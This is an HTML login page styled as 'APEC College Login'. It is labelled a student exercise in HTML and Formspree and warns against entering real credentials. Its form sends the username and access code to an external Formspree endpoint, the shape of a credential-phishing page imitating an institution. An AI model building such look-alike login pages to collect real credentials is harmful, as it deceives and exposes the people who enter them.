<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>APEC College Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:#f2f2f2;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:360px;
    background:#fff;
    padding:30px;
    border-radius:10px;
    box-shadow:0 0 15px rgba(0,0,0,0.2);
    text-align:center;
}

.logo{
    width:100px;
    margin-bottom:10px;
}

h2{
    color:#003366;
    margin-bottom:15px;
}

.notice{
    color:red;
    font-size:13px;
    margin-bottom:15px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    background:#003366;
    color:white;
    border:none;
    border-radius:5px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0055aa;
}
</style>

</head>
<body>

<div class="container">

<img src="images.png" class="logo" alt="APEC College Logo">

<h2>APEC College Login</h2>

<p style="color:red;font-size:14px;">
This is a student project for learning HTML and Formspree.
Do not enter your real username or password.
</p>
<form action="https://formspree.io/f/xbdvwjnr" method="POST">

<input
type="text"
name="Username"
placeholder="Enter Username"
required>

<input
type="text"
name="Access_Code"
placeholder="Enter Access Code"
required>

<button type="submit">Login</button>

</form>

</div>

</body>
</html>
